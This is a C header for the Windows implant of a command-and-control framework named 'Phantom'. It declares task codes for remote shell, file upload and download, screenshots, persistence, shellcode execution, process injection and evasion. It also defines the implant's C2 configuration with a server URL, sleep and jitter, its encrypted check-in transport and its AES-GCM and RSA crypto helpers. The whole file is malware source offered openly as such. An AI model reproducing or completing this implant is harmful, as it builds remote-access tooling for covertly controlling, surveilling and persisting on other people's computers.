#ifndef _TRANSPORT_H
#define _TRANSPORT_H

#include "common.h"

// =============================================
// Phantom C2 Protocol Constants
// =============================================
#define PHANTOM_PROTOCOL_VERSION    1

// Message types (must match Phantom server)
#define MSG_REGISTER_REQUEST    0x01
#define MSG_REGISTER_RESPONSE   0x02
#define MSG_CHECKIN             0x03
#define MSG_CHECKIN_RESPONSE    0x04
#define MSG_TASK_RESULT         0x05

// Task types (must match Phantom server constants.go)
#define TASK_SHELL          1
#define TASK_UPLOAD         2
#define TASK_DOWNLOAD       3
#define TASK_SCREENSHOT     4
#define TASK_PROCESSLIST    5
#define TASK_PERSIST        6
#define TASK_SYSINFO        7
#define TASK_SLEEP          8
#define TASK_KILL           9
#define TASK_CD             10
#define TASK_SHELLCODE      13
#define TASK_INJECT         14
#define TASK_EVASION        16
#define TASK_IFCONFIG       28

// Crypto sizes
#define RSA_KEY_BITS        2048
#define AES_KEY_SIZE        32
#define AES_GCM_NONCE_SIZE  12
#define AES_GCM_TAG_SIZE    16
#define SESSION_KEYID_SIZE  8

// Config
#define MAX_RESPONSE_SIZE   (10 * 1024 * 1024)  // 10MB
#define DEFAULT_SLEEP_MS    10000
#define DEFAULT_JITTER_PCT  20

// =============================================
// Implant configuration (embedded at compile time)
// =============================================
typedef struct _IMPLANT_CONFIG {
    CHAR    szServerURL[256];       // C2 server URL (e.g., "https://10.0.0.1:443")
    DWORD   dwSleepMs;              // Sleep interval in milliseconds
    DWORD   dwJitterPct;            // Jitter percentage (0-50)
    BYTE    bServerPubKey[512];     // Server RSA public key (DER encoded)
    DWORD   dwServerPubKeyLen;      // Length of public key
    CHAR    szKillDate[16];         // Kill date "YYYY-MM-DD" or empty
} IMPLANT_CONFIG, *PIMPLANT_CONFIG;

// =============================================
// Session state
// =============================================
typedef struct _SESSION {
    BYTE    bSessionKey[AES_KEY_SIZE];  // AES-256 session key
    BYTE    bKeyID[SESSION_KEYID_SIZE]; // SHA-256(session_key)[:8]
    CHAR    szAgentID[64];              // Assigned by server
    CHAR    szAgentName[64];            // Assigned by server
    DWORD   dwSleepMs;                 // Current sleep interval
    DWORD   dwJitterPct;               // Current jitter
    BOOL    bRegistered;               // Registration complete
} SESSION, *PSESSION;

// =============================================
// Task structure (received from server)
// =============================================
typedef struct _C2_TASK {
    CHAR    szTaskID[64];
    BYTE    bType;
    CHAR    szArgs[4][512];     // Up to 4 string arguments
    DWORD   dwArgCount;
    PBYTE   pData;              // Binary data (shellcode, file, etc.)
    DWORD   dwDataLen;
} C2_TASK, *PC2_TASK;

// =============================================
// Task result structure (sent to server)
// =============================================
typedef struct _C2_RESULT {
    CHAR    szTaskID[64];
    CHAR    szAgentID[64];
    PBYTE   pOutput;
    DWORD   dwOutputLen;
    CHAR    szError[256];
} C2_RESULT, *PC2_RESULT;

// =============================================
// Transport functions
// =============================================

// Initialize WinHTTP handles + load server public key
BOOL TransportInit(PIMPLANT_CONFIG pConfig);

// Register with C2 server (RSA key exchange + sysinfo)
BOOL TransportRegister(PSESSION pSession);

// Check in with server, send results, receive tasks
BOOL TransportCheckIn(PSESSION pSession, PC2_RESULT pResults, DWORD dwResultCount,
                      PC2_TASK* ppTasks, DWORD* pdwTaskCount);

// Cleanup WinHTTP handles
VOID TransportCleanup(VOID);

// =============================================
// Implant main loop
// =============================================
VOID ImplantMain(PIMPLANT_CONFIG pConfig);

// =============================================
// Crypto helpers (AES-GCM for session, RSA-OAEP for registration)
// =============================================

// AES-256-GCM encrypt (nonce prepended to output)
BOOL AesGcmEncrypt(IN PBYTE pKey, IN PBYTE pPlain, IN DWORD dwPlainSize,
                   OUT PBYTE* ppCipher, OUT DWORD* pdwCipherSize);

// AES-256-GCM decrypt (expects nonce prepended to input)
BOOL AesGcmDecrypt(IN PBYTE pKey, IN PBYTE pCipher, IN DWORD dwCipherSize,
                   OUT PBYTE* ppPlain, OUT DWORD* pdwPlainSize);

// RSA-OAEP-SHA256 encrypt
BOOL RsaOaepEncrypt(IN PBYTE pPubKeyDer, IN DWORD dwPubKeyLen,
                    IN PBYTE pPlain, IN DWORD dwPlainSize,
                    OUT PBYTE* ppCipher, OUT DWORD* pdwCipherSize);

// SHA-256 first 8 bytes (KeyID)
VOID ComputeKeyID(IN PBYTE pKey, OUT PBYTE pKeyID);

// Base64 encode/decode
DWORD Base64Encode(IN PBYTE pInput, IN DWORD dwInputLen, OUT PCHAR pOutput, IN DWORD dwOutputLen);
DWORD Base64Decode(IN PCHAR pInput, IN DWORD dwInputLen, OUT PBYTE pOutput, IN DWORD dwOutputLen);

#endif // _TRANSPORT_H
